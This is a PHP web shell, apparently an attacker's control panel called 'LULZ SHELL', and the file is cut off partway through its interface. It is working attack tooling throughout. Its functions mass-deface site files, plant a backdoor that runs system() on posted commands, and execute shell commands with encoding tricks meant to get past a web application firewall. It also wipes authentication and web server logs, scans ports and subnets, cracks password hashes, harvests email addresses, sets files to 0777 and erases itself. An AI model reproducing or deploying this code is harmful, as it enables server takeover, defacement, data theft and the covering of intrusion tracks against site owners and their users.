<?php
session_start();
$password = "lulz2025";
$version = "LULZ SHELL";
$author = "LULZS NOSTR4";


error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

class LulzShell {
    
    
    public static function massDeface($dir, $content, $mode = "html") {
        $results = [];
        
        
        if (!is_dir($dir)) {
            return ["Error: Directory does not exist - " . $dir];
        }
        
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $ext = strtolower($file->getExtension());
                    $target = false;
                    
                    switch($mode) {
                        case "html": 
                            $target = in_array($ext, ['html','htm','php','txt','js','css']); 
                            break;
                        case "all": 
                            $target = true; 
                            break;
                        case "images": 
                            $target = in_array($ext, ['jpg','jpeg','png','gif','bmp']); 
                            break;
                    }
                    
                    if ($target) {
                        $filepath = $file->getPathname();
                        if (is_writable($filepath)) {
                            if (file_put_contents($filepath, $content) !== false) {
                                $results[] = "✓ DEFACED: " . $filepath;
                            } else {
                                $results[] = "✗ FAILED: " . $filepath;
                            }
                        } else {
                            $results[] = "✗ NO PERMISSION: " . $filepath;
                        }
                    }
                }
            }
        } catch (Exception $e) {
            $results[] = "Error: " . $e->getMessage();
        }
        
        return $results;
    }
    
  
    public static function portScan($host, $ports) {
        $results = [];
        
        
        if (empty($host)) {
            return ["Error: No host specified"];
        }
        
        foreach ($ports as $port) {
            if ($port < 1 || $port > 65535) {
                $results[] = "Invalid port: $port";
                continue;
            }
            
            $connection = @fsockopen($host, $port, $errno, $errstr, 2);
            if (is_resource($connection)) {
                $service = getservbyport($port, "tcp");
                $results[] = " PORT $port ($service) - OPEN";
                fclose($connection);
            } else {
                $results[] = " PORT $port - CLOSED";
            }
        }
        return $results;
    }
    
    
    public static function recursiveDelete($dir) {
        if (!is_dir($dir)) return false;
        
        $files = array_diff(scandir($dir), ['.','..']);
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            is_dir($path) ? self::recursiveDelete($path) : unlink($path);
        }
        return rmdir($dir);
    }
    
    
    public static function createBackdoor($path, $password = "lulz2025") {
        $backdoor_code = '<?php if(isset($_POST["p"])&&$_POST["p"]=="'.$password.'"){@system($_POST["c"]);}?>';
        return file_put_contents($path, $backdoor_code) !== false;
    }
    
    
    public static function executeBypass($command, $technique) {
        if (empty($command)) {
            return "Error: No command specified";
        }
        
        $bypassed = $command;
        
        switch($technique) {
            case 'base64':
                $bypassed = "echo '" . base64_encode($command) . "' | base64 -d | sh";
                break;
            case 'rot13':
                $bypassed = "echo '" . str_rot13($command) . "' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh";
                break;
            case 'hex':
                $bypassed = "echo '" . bin2hex($command) . "' | xxd -p -r | sh";
                break;
            case 'reverse':
                $bypassed = "echo '" . strrev($command) . "' | rev | sh";
                break;
            case 'direct':
            default:
                $bypassed = $command;
        }
        
        $output = shell_exec($bypassed . " 2>&1");
        return $output ?: "No output (command may have executed silently)";
    }
    
    
    public static function selfDestruct() {
        $current_file = __FILE__;
        if (file_exists($current_file)) {
            // Overwrite with random data first
            file_put_contents($current_file, str_repeat('0', filesize($current_file)));
            // Then delete
            return unlink($current_file);
        }
        return false;
    }
    
    
    public static function dumpDatabase($host, $user, $pass, $database) {
        $tables = [];
        try {
            $conn = new mysqli($host, $user, $pass, $database);
            if ($conn->connect_error) {
                return ["Error: " . $conn->connect_error];
            }
            
            $result = $conn->query("SHOW TABLES");
            while ($row = $result->fetch_array()) {
                $tables[] = $row[0];
            }
            $conn->close();
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return $tables;
    }
    
   
    public static function dnsLookup($domain, $type = "A") {
        $results = [];
        try {
            $records = dns_get_record($domain, constant("DNS_$type"));
            foreach ($records as $record) {
                $results[] = $record;
            }
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return $results;
    }
    
    
    public static function hashCrack($hash, $wordlist) {
        if (!file_exists($wordlist)) {
            return ["Error: Wordlist file not found"];
        }
        
        $words = file($wordlist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($words as $word) {
            if (md5($word) === $hash) return "Cracked: $word";
            if (sha1($word) === $hash) return "Cracked: $word";
        }
        return "Hash not cracked";
    }
    
    
    public static function processManager() {
        $output = shell_exec('ps aux 2>&1');
        $processes = explode("\n", $output);
        return array_slice($processes, 0, 50); // Return first 50 processes
    }
    
    
    public static function networkScan($subnet) {
        $results = [];
        for ($i = 1; $i < 255; $i++) {
            $ip = "$subnet.$i";
            $ping = shell_exec("ping -c 1 -W 1 $ip 2>&1");
            if (strpos($ping, "1 received")) {
                $results[] = "ALIVE: $ip";
            }
        }
        return $results;
    }
    
    
    public static function fileSearch($dir, $pattern) {
        $results = [];
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            
            foreach ($iterator as $file) {
                if (strpos($file->getFilename(), $pattern) !== false) {
                    $results[] = $file->getPathname();
                }
            }
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return $results;
    }
    
   
    public static function fixPermissions($dir, $mode = 0777) {
        $results = [];
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if (chmod($item->getPathname(), $mode)) {
                    $results[] = "Fixed: " . $item->getPathname();
                }
            }
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return $results;
    }
    
    
    public static function emailHarvester($dir) {
        $emails = [];
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            
            foreach ($iterator as $file) {
                if ($file->isFile() && in_array($file->getExtension(), ['php', 'html', 'txt', 'js'])) {
                    $content = file_get_contents($file->getPathname());
                    preg_match_all('/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $content, $matches);
                    $emails = array_merge($emails, $matches[0]);
                }
            }
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return array_unique($emails);
    }
    
    
    public static function minerCheck($dir) {
        $suspicious = [];
        $miner_keywords = ['minerd', 'xmrig', 'cpuminer', 'cryptonight', 'stratum', 'pool'];
        
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $content = file_get_contents($file->getPathname());
                    foreach ($miner_keywords as $keyword) {
                        if (stripos($content, $keyword) !== false) {
                            $suspicious[] = "MINER: " . $file->getPathname() . " ($keyword)";
                            break;
                        }
                    }
                }
            }
        } catch (Exception $e) {
            return ["Error: " . $e->getMessage()];
        }
        return $suspicious;
    }
    
   
    public static function cleanLogs() {
        $log_files = [
            '/var/log/auth.log',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/syslog',
            '/var/log/messages'
        ];
        
        $results = [];
        foreach ($log_files as $log) {
            if (file_exists($log) && is_writable($log)) {
                if (file_put_contents($log, '') !== false) {
                    $results[] = "Cleaned: $log";
                }
            }
        }
        return $results;
    }
}


if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['lulz_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
        $_SESSION['lulz_auth'] = true;
        $_SESSION['login_time'] = time();
    } else {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LULZ SHELL v6.0</title>
            <style>
                * { 
                    margin: 0; 
                    padding: 0; 
                    box-sizing: border-box; 
                    font-family: "Courier New", monospace; 
                }
                
                body { 
                    background: #0a0a0a;
                    min-height: 100vh; 
                    display: flex; 
                    align-items: center; 
                    justify-content: center;
                    padding: 20px;
                }
                
                .login-container { 
                    background: #111;
                    padding: 30px;
                    border: 1px solid #ff0000;
                    text-align: center;
                    width: 100%;
                    max-width: 350px;
                    border-radius: 5px;
                }
                
                .logo { 
                    margin-bottom: 25px; 
                }
                
                .logo h1 { 
                    color: #ff0000; 
                    font-size: 22px;
                    margin-bottom: 5px;
                }
                
                .logo h2 { 
                    color: #aaa; 
                    font-size: 11px;
                    letter-spacing: 3px;
                }
                
                input[type="password"] { 
                    width: 100%; 
                    padding: 10px;
                    margin: 15px 0; 
                    background: #222;
                    border: 1px solid #333; 
                    color: #fff;
                    text-align: center;
                    border-radius: 3px;
                }
                
                button { 
                    background: #ff0000; 
                    color: white; 
                    border: none; 
                    padding: 10px;
                    width: 100%;
                    cursor: pointer;
                    border-radius: 3px;
                }
                
                .warning {
                    color: #ff4444;
                    font-size: 10px;
                    margin-top: 15px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="logo">
                    <h1>LULZ SHELL</h1>
                    <h2></h2>
                </div>
                <form method="POST">
                    <input type="password" name="pass" placeholder="ENTER THE PASSWORD" required>
                    <button type="submit">ACCESS</button>
                </form>
                <div class="warning"></div>
            </div>
        </body>
        </html>';
        exit;
    }
}


$path = $_GET['path'] ?? getcwd();
@chdir($path);
$path = getcwd();


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    
    if (isset($_POST['mass_deface'])) {
        $deface_dir = $_POST['deface_dir'] ?? $path;
        $deface_content = $_POST['deface_content'] ?? 'HACKED BY LULZSEC';
        $deface_mode = $_POST['deface_mode'] ?? 'html';
        
        $_SESSION['deface_results'] = LulzShell::massDeface($deface_dir, $deface_content, $deface_mode);
    }
    
    
    if (isset($_POST['port_scan'])) {
        $host = $_POST['scan_host'] ?? '127.0.0.1';
        $port_range = $_POST['scan_ports'] ?? '1-100';
        
      
        if (strpos($port_range, '-') !== false) {
            list($start, $end) = explode('-', $port_range);
            $ports = range($start, $end);
        } else {
            $ports = array_map('intval', explode(',', $port_range));
        }
        
        $_SESSION['scan_results'] = LulzShell::portScan($host, $ports);
    }
    
    
    if (isset($_POST['create_backdoor'])) {
        $backdoor_path = $_POST['backdoor_path'] ?? $path . '/shell.php';
        $backdoor_pass = $_POST['backdoor_pass'] ?? 'lulz2025';
        
        if (LulzShell::createBackdoor($backdoor_path, $backdoor_pass)) {
            $_SESSION['backdoor_result'] = "✓ Backdoor created: " . $backdoor_path;
        } else {
            $_SESSION['backdoor_result'] = "✗ Failed to create backdoor";
        }
    }
    
    
    if (isset($_POST['bypass_command'])) {
        $command = $_POST['command'] ?? 'whoami';
        $technique = $_POST['technique'] ?? 'direct';
        
        $_SESSION['bypass_result'] = LulzShell::executeBypass($command, $technique);
    }
    
   
    if (isset($_POST['self_destruct'])) {
        if (LulzShell::selfDestruct()) {
            session_destroy();
            die("Shell destroyed successfully");
        }
    }
    
    
    if (isset($_POST['dump_database'])) {
        $db_host = $_POST['db_host'] ?? 'localhost';
        $db_user = $_POST['db_user'] ?? 'root';
        $db_pass = $_POST['db_pass'] ?? '';
        $db_name = $_POST['db_name'] ?? 'test';
        
        $_SESSION['db_results'] = LulzShell::dumpDatabase($db_host, $db_user, $db_pass, $db_name);
    }
    
    
    if (isset($_POST['dns_lookup'])) {
        $domain = $_POST['dns_domain'] ?? 'example.com';
        $type = $_POST['dns_type'] ?? 'A';
        
        $_SESSION['dns_results'] = LulzShell::dnsLookup($domain, $type);
    }
    
   
    if (isset($_POST['hash_crack'])) {
        $hash = $_POST['crack_hash'] ?? '';
        $wordlist = $_POST['crack_wordlist'] ?? '/usr/share/dict/words';
        
        $_SESSION['crack_results'] = LulzShell::hashCrack($hash, $wordlist);
    }
    
    
    if (isset($_POST['process_list'])) {
        $_SESSION['process_results'] = LulzShell::processManager();
    }
    
    
    if (isset($_POST['network_scan'])) {
        $subnet = $_POST['scan_subnet'] ?? '192.168.1';
        $_SESSION['network_results'] = LulzShell::networkScan($subnet);
    }
    
    
    if (isset($_POST['file_search'])) {
        $search_dir = $_POST['search_dir'] ?? $path;
        $pattern = $_POST['search_pattern'] ?? 'config';
        $_SESSION['search_results'] = LulzShell::fileSearch($search_dir, $pattern);
    }
    
   
    if (isset($_POST['fix_permissions'])) {
        $fix_dir = $_POST['fix_dir'] ?? $path;
        $mode = octdec($_POST['fix_mode'] ?? '0777');
        $_SESSION['fix_results'] = LulzShell::fixPermissions($fix_dir, $mode);
    }
    
   
    if (isset($_POST['harvest_emails'])) {
        $harvest_dir = $_POST['harvest_dir'] ?? $path;
        $_SESSION['email_results'] = LulzShell::emailHarvester($harvest_dir);
    }
    
   
    if (isset($_POST['miner_check'])) {
        $check_dir = $_POST['check_dir'] ?? $path;
        $_SESSION['miner_results'] = LulzShell::minerCheck($check_dir);
    }
    
   
    if (isset($_POST['clean_logs'])) {
        $_SESSION['clean_results'] = LulzShell::cleanLogs();
    }
    
  
    if (isset($_POST['upload'])) {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $target_path = $path . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
                $_SESSION['upload_result'] = "✓ File uploaded: " . $_FILES['file']['name'];
            } else {
                $_SESSION['upload_result'] = "✗ Upload failed";
            }
        }
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}


if (isset($_GET['delete'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        LulzShell::recursiveDelete($target);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_GET['delete_all'])) {
    $files = array_diff(scandir($path), ['.','..']);
    foreach ($files as $file) {
        $fullpath = $path . DIRECTORY_SEPARATOR . $file;
        is_dir($fullpath) ? LulzShell::recursiveDelete($fullpath) : unlink($fullpath);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_GET['createfile'])) {
    $filename = $path . DIRECTORY_SEPARATOR . $_GET['createfile'];
    file_put_contents($filename, '');
    header("Location: ?path=" . urlencode($path) . "&edit=" . urlencode($_GET['createfile']));
    exit;
}

if (isset($_GET['createfolder'])) {
    $foldername = $path . DIRECTORY_SEPARATOR . $_GET['createfolder'];
    mkdir($foldername, 0755, true);
    header("Location: ?path=" . urlencode($path));
    exit;
}


if (isset($_POST['savefile']) && isset($_GET['edit'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (is_file($file)) {
        file_put_contents($file, $_POST['content']);
        $_SESSION['save_result'] = "✓ File saved successfully";
    }
    header("Location: ?path=" . urlencode($path) . "&edit=" . urlencode($_GET['edit']));
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LULZ GLOBAL SHELL</title>
    <style>
        :root {
            --red: #ff0000;
            --dark: #0a0a0a;
            --darker: #050505;
            --panel: #111;
            --text: #fff;
            --border: #333;
            --green: #00ff00;
            --blue: #0088ff;
            --yellow: #ffff00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: var(--dark);
            color: var(--text);
            font-size: 14px;
        }
        
        .header {
            background: var(--darker);
            padding: 15px;
            border-bottom: 2px solid var(--red);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo h1 {
            color: var(--red);
            font-size: 18px;
        }
        
        .status-bar {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .status-item {
            background: rgba(255,0,0,0.2);
            padding: 5px 10px;
            border: 1px solid var(--red);
            font-size: 12px;
        }
        
        .container {
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--panel);
            padding: 15px;
            border-left: 3px solid var(--red);
        }
        
        .tabs {
            display: flex;
            background: var(--panel);
            border-bottom: 1px solid var(--border);
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 12px 20px;
            background: transparent;
            border: none;
            color: var(--text);
            cursor: pointer;
            border-bottom: 2px solid transparent;
            white-space: nowrap;
        }
        
        .tab.active {
            border-bottom-color: var(--red);
            background: rgba(255,0,0,0.1);
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            background: var(--panel);
        }
        
        .tab-content.active {
            display: block;
        }
        
        .panel {
            margin-bottom: 20px;
        }
        
        .panel h3 {
            color: var(--red);
            margin-bottom: 15px;
            padding-bottom: 5px;
            border-bottom: 1px solid var(--border);
        }
        
        input, textarea, select {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            background: #222;
            border: 1px solid var(--border);
            color: var(--text);
        }
        
        .btn {
            background: var(--red);
            color: white;
            border: none;
            padding: 8px 15px;
            margin: 2px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-danger { background: #900; }
        .btn-success { background: #090; }
        .btn-warning { background: #950; }
        .btn-info { background: #009; }
        
        .terminal {
            background: #000;
            color: var(--green);
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-family: monospace;
            border: 1px solid var(--red);
            white-space: pre-wrap;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }
        
        .file-table th, .file-table td {
            padding: 10px;
            border-bottom: 1px solid var(--border);
            text-align: left;
        }
        
        .file-table th {
            background: rgba(255,0,0,0.1);
            color: var(--red);
        }
        
        .quick-actions {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        
        .success { color: var(--green); }
        .error { color: #ff4444; }
        .warning { color: var(--yellow); }
        
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        
        .feature-card {
            background: rgba(255,0,0,0.05);
            padding: 15px;
            border: 1px solid var(--border);
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <h1>LULZ GLOBAL SHELL</h1>
        </div>
        <div class="status-bar">
            <div class="status-item">User: <?= get_current_user() ?></div>
            <div class="status-item">Path: <?= htmlspecialchars($path) ?></div>
            <div class="status-item">PHP: <?= PHP_VERSION ?></div>
            <a href="?logout=true" class="btn btn-danger">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="dashboard">
            <div class="stat-card">
                <strong>OS</strong><br>
                <?= php_uname('s') ?> <?= php_uname('r') ?>
            </div>
            <div class="stat-card">
                <strong>Memory Usage</strong><br>
                <?= round(memory_get_usage(true)/1048576,2) ?> MB
            </div>
            <div class="stat-card">
                <strong>Disk Free</strong><br>
                <?= round(disk_free_space($path)/1073741824,2) ?> GB
            </div>
            <div class="stat-card">
                <strong>Uptime</strong><br>
                <?= @shell_exec('uptime 2>&1') ?: 'N/A' ?>
            </div>
        </div>

        <div class="tabs">
            <button class="tab active" data-tab="files">File Manager</button>
            <button class="tab" data-tab="terminal">Terminal</button>
            <button class="tab" data-tab="deface">Mass Deface</button>
            <button class="tab" data-tab="scan">Port Scanner</button>
            <button class="tab" data-tab="backdoor">Backdoor</button>
            <button class="tab" data-tab="waf">WAF Bypass</button>
            <button class="tab" data-tab="new">NEW FEATURES</button>
            <button class="tab" data-tab="destruct">Self Destruct</button>
        </div>

        <!-- File Manager -->
        <div id="files" class="tab-content active">
            <div class="panel">
                <h3>File Manager - <?= htmlspecialchars($path) ?></h3>
                
                <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                    <input type="text" id="pathInput" value="<?= htmlspecialchars($path) ?>" style="flex: 1; min-width: 300px;">
                    <button class="btn" onclick="goToPath()">Go</button>
                    <button class="btn" onclick="createFile()">New File</button>
                    <button class="btn" onclick="createFolder()">New Folder</button>
                </div>

                <div class="quick-actions">
                    <a href="?path=<?= urlencode(dirname($path)) ?>" class="btn"> Up</a>
                    <a href="?path=<?= urlencode($path) ?>" class="btn">🔄 Refresh</a>
                    <button class="btn" onclick="showUpload()">Upload</button>
                    <button class="btn btn-danger" onclick="deleteAll()"> Delete All</button>
                </div>

                <?php if (isset($_SESSION['upload_result'])): ?>
                    <div class="<?= strpos($_SESSION['upload_result'], '✓') !== false ? 'success' : 'error' ?>">
                        <?= $_SESSION['upload_result'] ?>
                    </div>
                    <?php unset($_SESSION['upload_result']); ?>
                <?php endif; ?>

                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($path !== DIRECTORY_SEPARATOR): ?>
                        <tr>
                            <td><a href="?path=<?= urlencode(dirname($path)) ?>" style="color: var(--red);"> /</a></td>
                            <td>-</td><td>-</td><td>-</td><td>-</td>
                        </tr>
                        <?php endif;
                        
                        $items = scandir($path);
                        foreach ($items as $item):
                            if ($item == ".") continue;
                            $full = $path . DIRECTORY_SEPARATOR . $item;
                            $isDir = is_dir($full);
                        ?>
                        <tr>
                            <td><?= $isDir ? '' : '' ?> <?= htmlspecialchars($item) ?></td>
                            <td><?= $isDir ? '-' : formatSize(filesize($full)) ?></td>
                            <td><?= date("Y-m-d H:i", filemtime($full)) ?></td>
                            <td><?= substr(sprintf('%o', fileperms($full)), -4) ?></td>
                            <td style="white-space: nowrap;">
                                <?php if (!$isDir): ?>
                                <a href="?path=<?= urlencode($path) ?>&edit=<?= urlencode($item) ?>" class="btn">EDIT</a>
                                <a href="?path=<?= urlencode($path) ?>&download=<?= urlencode($item) ?>" class="btn">DOWNLOAD</a>
                                <?php else: ?>
                                <a href="?path=<?= urlencode($full) ?>" class="btn">OPEN</a>
                                <?php endif; ?>
                                <a href="?path=<?= urlencode($path) ?>&delete=<?= urlencode($item) ?>" class="btn btn-danger" onclick="return confirm('Delete?')">DELETE</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>

                <div id="uploadForm" style="margin-top: 20px; display: none;">
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="file" required>
                        <button type="submit" name="upload" class="btn btn-success">Upload File</button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Terminal -->
        <div id="terminal" class="tab-content">
            <div class="panel">
                <h3>System Terminal</h3>
                <form method="POST">
                    <input type="text" name="cmd" placeholder="Enter command..." value="ls -la" required>
                    <button type="submit" class="btn">Execute</button>
                </form>
                
                <div class="quick-actions">
                    <button class="btn" onclick="setCommand('whoami')">Whoami</button>
                    <button class="btn" onclick="setCommand('pwd')">PWD</button>
                    <button class="btn" onclick="setCommand('ls -la')">List Files</button>
                    <button class="btn" onclick="setCommand('uname -a')">System Info</button>
                </div>

                <div class="terminal">
                    <?php
                    if (isset($_POST['cmd'])) {
                        $cmd = $_POST['cmd'];
                        echo "> " . htmlspecialchars($cmd) . "\n\n";
                        $output = shell_exec($cmd . " 2>&1");
                        echo $output ?: "No output";
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- Mass Deface -->
        <div id="deface" class="tab-content">
            <div class="panel">
                <h3>MASS DEFACE</h3>
                
                <form method="POST">
                    <input type="hidden" name="mass_deface" value="1">
                    
                    <label>Target Directory:</label>
                    <input type="text" name="deface_dir" value="<?= htmlspecialchars($path) ?>" required>
                    
                    <label>Deface Mode:</label>
                    <select name="deface_mode">
                        <option value="html">HTML/PHP/TXT/JS/CSS Files</option>
                        <option value="all">All Files</option>
                        <option value="images">Image Files</option>
                    </select>
                    
                    <label>Deface Content:</label>
                    <textarea name="deface_content" rows="6" required>&lt;h1&gt;HACKED BY LULZSEC&lt;/h1&gt;
&lt;p&gt;Security Test&lt;/p&gt;</textarea>
                    
                    <button type="submit" class="btn btn-danger" onclick="return confirm('Mass deface?')">Execute Mass Deface</button>
                </form>

                <?php if (isset($_SESSION['deface_results'])): ?>
                <div class="terminal" style="margin-top: 15px;">
                    <?= implode("\n", $_SESSION['deface_results']) ?>
                </div>
                <?php unset($_SESSION['deface_results']); endif; ?>
            </div>
        </div>

        <!-- Port Scanner -->
        <div id="scan" class="tab-content">
            <div class="panel">
                <h3>Port Scanner - WORKING</h3>
                
                <form method="POST">
                    <input type="hidden" name="port_scan" value="1">
                    
                    <label>Target Host:</label>
                    <input type="text" name="scan_host" value="" required>
                    
                    <label>Port Range (e.g., 1-100 or 80,443,22):</label>
                    <input type="text" name="scan_ports" value="80,443,22,21,25" required>
                    
                    <button type="submit" class="btn">Start Scan</button>
                </form>

                <?php if (isset($_SESSION['scan_results'])): ?>
                <div class="terminal" style="margin-top: 15px;">
                    <?= implode("\n", $_SESSION['scan_results']) ?>
                </div>
                <?php unset($_SESSION['scan_results']); endif; ?>
            </div>
        </div>

        <!-- Backdoor -->
        <div id="backdoor" class="tab-content">
            <div class="panel">
                <h3>Backdoor Generator - WORKING</h3>
                
                <form method="POST">
                    <input type="hidden" name="create_backdoor" value="1">
                    
                    <label>Backdoor Path:</label>
                    <input type="text" name="backdoor_path" value="<?= htmlspecialchars($path) ?>/shell.php" required>
                    
                    <label>Backdoor Password:</label>
                    <input type="text" name="backdoor_pass" value="lulz2025" required>
                    
                    <button type="submit" class="btn">Create Backdoor</button>
                </form>

                <?php if (isset($_SESSION['backdoor_result'])): ?>
                <div class="terminal" style="margin-top: 15px;">
                    <?= $_SESSION['backdoor_result'] ?>
                </div>
                <?php unset($_SESSION['backdoor_result']); endif; ?>
            </div>
        </div>

        <!-- WAF Bypass -->
        <div id="waf" class="tab-content">
            <div class="panel">
                <h3>WAF Bypass - WORKING</h3>
                
                <form method="POST">
                    <input type="hidden" name="bypass_command" value="1">
                    
                    <label>Command:</label>
                    <input type="text" name="command" value="ls -la" required>
                    
                    <label>Bypass Technique:</label>
                    <select name="technique">
                        <option value="direct">Direct</option>
                        <option value="base64">Base64</option>
                        <option value="rot13">ROT13</option>
                        <option value="hex">Hex</option>
                        <option value="reverse">Reverse</option>
                    </select>
                    
                    <button type="submit" class="btn">Execute with Bypass</button>
                </form>

                <?php if (isset($_SESSION['bypass_result'])): ?>
                <div class="terminal" style="margin-top: 15px;">
                    <?= htmlspecialchars($_SESSION['bypass_result']) ?>
                </div>
                <?php unset($_SESSION['bypass_result']); endif; ?>
            </div>
        </div>

        <!-- NEW FEATURES -->
        <div id="new" class="tab-content">
            <div class="panel">
                <h3> 11 NEW FEATURES ADDED BY LULZGLOBAL ENJOY</h3>
                
                <div class="feature-grid">
                    <!-- Database Dumper -->
                    <div class="feature-card">
                        <h4>Database Dumper</h4>
                        <form method="POST">
                            <input type="hidden" name="dump_database" value="1">
                            <input type="text" name="db_host" placeholder="Host" value="localhost">
                            <input type="text" name="db_user" placeholder="User" value="root">
                            <input type="text" name="db_pass" placeholder="Password">
                            <input type="text" name="db_name" placeholder="Database" value="test">
                            <button type="submit" class="btn">Dump Tables</button>
                        </form>
                        <?php if (isset($_SESSION['db_results'])): ?>
                        <div class="terminal" style="height: 200px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['db_results']) ?>
                        </div>
                        <?php unset($_SESSION['db_results']); endif; ?>
                    </div>

                    <!-- DNS Lookup -->
                    <div class="feature-card">
                        <h4>DNS Lookup</h4>
                        <form method="POST">
                            <input type="hidden" name="dns_lookup" value="1">
                            <input type="text" name="dns_domain" placeholder="Domain" value="example.com">
                            <select name="dns_type">
                                <option value="A">A Record</option>
                                <option value="MX">MX Record</option>
                                <option value="CNAME">CNAME</option>
                                <option value="TXT">TXT</option>
                            </select>
                            <button type="submit" class="btn">Lookup</button>
                        </form>
                        <?php if (isset($_SESSION['dns_results'])): ?>
                        <div class="terminal" style="height: 200px; margin-top: 10px;">
                            <?php print_r($_SESSION['dns_results']); ?>
                        </div>
                        <?php unset($_SESSION['dns_results']); endif; ?>
                    </div>

                    <!-- Hash Cracker -->
                    <div class="feature-card">
                        <h4>Hash Cracker</h4>
                        <form method="POST">
                            <input type="hidden" name="hash_crack" value="1">
                            <input type="text" name="crack_hash" placeholder="MD5 or SHA1 Hash">
                            <input type="text" name="crack_wordlist" placeholder="Wordlist path" value="/usr/share/dict/words">
                            <button type="submit" class="btn">Crack Hash</button>
                        </form>
                        <?php if (isset($_SESSION['crack_results'])): ?>
                        <div class="terminal" style="height: 100px; margin-top: 10px;">
                            <?= $_SESSION['crack_results'] ?>
                        </div>
                        <?php unset($_SESSION['crack_results']); endif; ?>
                    </div>

                    <!-- Process Manager -->
                    <div class="feature-card">
                        <h4>Process Manager</h4>
                        <form method="POST">
                            <input type="hidden" name="process_list" value="1">
                            <button type="submit" class="btn">List Processes</button>
                        </form>
                        <?php if (isset($_SESSION['process_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['process_results']) ?>
                        </div>
                        <?php unset($_SESSION['process_results']); endif; ?>
                    </div>

                    <!-- Network Scanner -->
                    <div class="feature-card">
                        <h4>Network Scanner</h4>
                        <form method="POST">
                            <input type="hidden" name="network_scan" value="1">
                            <input type="text" name="scan_subnet" placeholder="Subnet" value="192.168.1">
                            <button type="submit" class="btn">Scan Network</button>
                        </form>
                        <?php if (isset($_SESSION['network_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['network_results']) ?>
                        </div>
                        <?php unset($_SESSION['network_results']); endif; ?>
                    </div>

                    <!-- File Search -->
                    <div class="feature-card">
